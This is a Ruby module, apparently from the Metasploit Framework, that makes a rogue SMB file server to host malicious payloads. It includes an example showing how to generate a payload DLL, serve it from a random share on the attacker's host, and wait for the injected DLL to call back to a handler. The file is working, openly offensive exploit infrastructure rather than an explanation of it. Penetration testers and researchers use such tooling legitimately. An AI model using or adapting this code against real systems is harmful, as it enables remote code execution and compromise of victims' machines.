# -*- coding: binary -*-
require 'rex/proto/smb'
require 'rex/proto/ntlm'
require 'rex/proto/dcerpc'
require 'rex/encoder/ndr'

module Msf
  module Exploit::Remote::SMB
    # In order to accomplish remote file injection (e.g. DLL) this
    # module emulates an SMB service process to allow clients to load a file
    # from a network share.
    #
    # Author: Matthew Hall <hallm [at] sec-1.com>
    module FileServer

      # Initialize the SMBFileServer Instance
      #
      # Parameters (SRVHOST, SRVPORT) are taken from the framework datastore
      # @return [void]
      def initialize(info = {})
        super
        register_options(
          [
             OptAddress.new('SRVHOST',  [ true, 'The local host the SMB Server is running on', '0.0.0.0']),
             OptPort.new('SRVPORT',    [ true, "The local port to listen on.", 445 ])
          ], self.class)
        @server = nil
      end

      # Clean up
      #
      # This will stop the SMB file server instance when handler is called
      # @return [void]
      def cleanup
        begin
          super
        ensure
          @server.stop if @server
        end
      end

      ##
      #
      # Start the SMBFileServer
      #
      # @param unc [String] The UNC path to expose by the server:
      #       ie. \\\\SRVHOST\\path\\to\\myfile.extension
      # @param contents [String] The contents of the file to be served
      #       (usually the MSF payload)
      # @param exe_file [String] The name of the file served:
      #       ie. myfile.extension
      # @return [void]
      # @raise [RuntimeError]
      #
      # Example Usage:
      #  include Msf::Exploit::Remote::SMBFileServer
      #  exe = generate_payload_dll
      #  @exe_file = rand_text_alpha(7) + ".dll"
      #  @share = rand_text_alpha(5)
      #  my_host = datastore['SRVHOST']
      #  @unc = "\\\\#{my_host}\\#{@share}\\#{@exe_file}"
      #  start_smb_server(@unc, exe, @exe_file)
      #  // Inject DLL
      #  handler
      #
      ##
      def start_smb_server(unc, contents, exe_file)
        @server.stop if @server
        vprint_status("Starting SMB Server on " + datastore['SRVHOST'].to_s + ":" + datastore['SRVPORT'].to_s)

        @server = Rex::Proto::SMB::Server.new(datastore['SRVPORT'].to_i, datastore['SRVHOST'],
          :context => {
           'Msf'        => framework,
           'MsfExploit' => self,
          }
        )
        hi, lo = ::Rex::Proto::SMB::Utils.time_unix_to_smb(Time.now.to_i)
        @server.register(unc, contents, exe_file, hi, lo)
        r = @server.start
        if not r
          @server.stop
          @server = nil
          raise RuntimeError, "Failed to register with server"
        end
        @server
      end
    end
  end
end
